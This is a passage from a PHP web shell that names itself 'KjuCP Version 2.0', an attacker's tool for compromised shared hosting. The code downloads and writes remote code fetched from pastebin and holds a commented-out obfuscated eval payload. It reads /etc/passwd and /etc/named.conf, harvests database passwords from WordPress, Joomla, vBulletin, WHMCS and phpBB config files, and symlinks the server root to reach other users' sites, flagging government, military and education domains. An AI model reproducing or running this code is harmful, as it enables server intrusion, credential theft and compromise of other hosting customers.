if (!empty($_POST['email'])){
$xx = rand();
mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
print "<center><b>send an report to [".$_POST['email']."] - $xx</b></center>"; 
}
  }
   elseif(isset($_GET["jump"]))
	{
       $wk=file_get_contents("http://pastebin.com/raw/kYuaSN2x");
       $fp=fopen("wk.php", "w+");
       fwrite($fp, $wk);
	 ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;

		//$jumper          = "3VRRb5swEP4rFwvNRqVAtkmTEiCTpk7aHjppe5rSiBlsilfAyDZrs2r/fefQpM3LfsCEMObuu++7Ox/IutVAMserTkLdcWvzG1L3otIPN6TInMFbQK07O/IBXa/RStbAAttDDmpQ5a10jFreyLLXQtIQ8hzSEDYwQ6huGroCoSQjV8Zos4JvRzC6vwxZ4kSBi/GLT6PIhPp1ykUNjUbNbVlWb969vYN+OSwh89mcILd8z32yHFojm5xuaEHi4OGa9zImWcKR2OMLuBLKKX1dlrssQY0CzpR+zjTwGZ8db+HTIPQgreJ3E7yq9bhfA4kFd5LR7zRyqpcsDGMCz1qwvgxhpibhGqx0pYeVneqVYyma3gcjit0LrLzRoxwYTaSrk9lII2ooglQDbPEEDOHR9w4Y2V7u4NBAWMEHPYnhh4Ovkgt4wfD/9vIPBONUYdu4MXzP0BJMVhp7Zqn10JwZFL6la7hvVSfZopG6Yce+ho84oM74g8AJtif73H6MLGCZph41aq+CWNwwHxPRFT0mMGCy3jtV6Ji9aeRDPEAo89t/Akmre5nQ+BQR0wSr6VRdtq7vEjqLsmfGBUZRn6O3K1saPGh/nuzA6R2HIstxsu0cZqNTNEq/9KJSNIf5NvorUBcXft9o5K1beGIAbueikF76/wLdftTTIGCxg+NAkM0+PyvnvBRS/MOZHOanMgX14pviLw==";

		//@eval(gzinflate(base64_decode($jumper)));
	}
	echo '<br>';
	echo "<font color='white'>[+] Founded</font> <font size=15 color='#4B0082'> ".sizeof($users)." </font><font color='white'> entrys in /etc/passwd</font>\n"."<br />";
	echo "<font color='white'>[+] Founded</font> <font color='#4B0082' size=15> ".sizeof($pub)." </font><font color='white'> readable public_html directories</font>\n"."<br /><br /><br />";

	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<table bgcolor=black class=style2 ><td>";
		echo "<font color=white><a target='_blank' href='wk.php?y=$path'>$path<a/></font><br>";
		echo "</td></table>";
		}
	echo "\n";
}
   elseif(isset($_GET["pws"]))
	{
        echo "<br><br><br>";
        echo'<form method="post">
<input type="text" name="conf" value="" />
<input type="submit" value="GeT Passwords" name="get" />
</form>';
 
$g = $_POST['get'];
$dir = $_POST['conf'];
//////////////////////////////////////////////////////////////////////////////////////////////
if(isset($g) && $dir != ""){
 
        $cn = @file_get_contents($dir);
        //preg_match_all('#href="(.*?)">(.*?)<#',$cn,$m);    // $m[2]
        preg_match_all('#href="(.*?)"#',$cn,$m);
       
       
        foreach($m[1] as $txt){
       
        $url = $dir.$txt;
        $cnurl = @file_get_contents($url);
        preg_match('#\'DB_PASSWORD\', \'(.*)\'#',$cnurl,$m1);             // wordpressi
        preg_match('#password = \'(.*)\'#',$cnurl,$m2);                   // joomla c
        preg_match('#password\'] = \'(.*)\'#',$cnurl,$m3);                        // vb
        preg_match('#db_password = "(.*)"#',$cnurl,$m4);                          // whmcs
        preg_match('#db_password = \'(.*)\'#',$cnurl,$m4);                        // whmcs
        preg_match('#dbpass = "(.*)"#',$cnurl,$m5);                               //
        preg_match('#password   = \'(.*)\'#',$cnurl,$m6);                         // connnect.php
        preg_match('#dbpasswd = \'(.*)\'#',$cnurl,$m8);                           // phpBB 3.0.x
        preg_match('#password_localhost = "(.*)"#',$cnurl,$m9);           // conexao.php
        preg_match('#senha = "(.*)"#',$cnurl,$m10);                       // /_inc/config.inc.php
       
        if(!empty($m1[1])){ echo $m1[1]."<br>"; }
        elseif(!empty($m2[1])){ echo $m2[1]."<br>"; }
        elseif(!empty($m3[1])){ echo $m3[1]."<br>"; }
        elseif(!empty($m4[1])){ echo $m4[1]."<br>"; }
        elseif(!empty($m5[1])){ echo $m5[1]."<br>"; }
        elseif(!empty($m6[1])){ echo $m6[1]."<br>"; }
        elseif(!empty($m7[1])){ echo $m7[1]."<br>"; }
        elseif(!empty($m8[1])){ echo $m8[1]."<br>"; }
    elseif(!empty($m9[1])){ echo $m9[1]."<br>"; }
        elseif(!empty($m10[1])){ echo $m10[1]."<br>"; }
       
        }
       
}
	} 
	 elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink')) {	 echo " <form action= method=post>";
 @set_time_limit(0);
 echo "<center>";
 @mkdir('sym',0777); 
$htaccess = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $write =@fopen ('sym/.htaccess','w'); fwrite($write ,$htaccess); @symlink('/','sym/root'); $filelocation = basename(__FILE__); $read_named_conf = @file('/etc/named.conf'); if(!$read_named_conf) { echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } else { echo "<br><br><div class='tmp'><table border=1 bordercolor=#4B0082 width=500 cellpadding=1 cellspacing=0><td><font color='white'>Domains</td><td>Users</td><td>symlink</font> </td>"; foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string); flush(); if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); $name = $UID['name'] ; @symlink('/','sym/root'); $name = $string[1][0]; $iran = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])) { $name = "<div style= color: #4B0082 ; text-shadow: 0px 0px 1px red; >".$string[1][0].'</div>'; } echo " <tr> <td> <div class=dom><a target=_blank href=http://www.".$string[1][0].'/>'.$name.' </a> </div> </td> <td> '.$UID['name']." </td> <td> <a href=sym/root/home/".$UID['name']."/public_html target=_blank>Symlink </a> </td> </tr></div> "; flush(); } } } } echo "</center></table>"; } 
	echo "</div><center><b><br><br><br><font color='#4B0082'>&copy 2020 </font></center><b>
		<br><center><font color='#4B0082'>KjuCP Version 2.0</font></center><br>";   
		
?>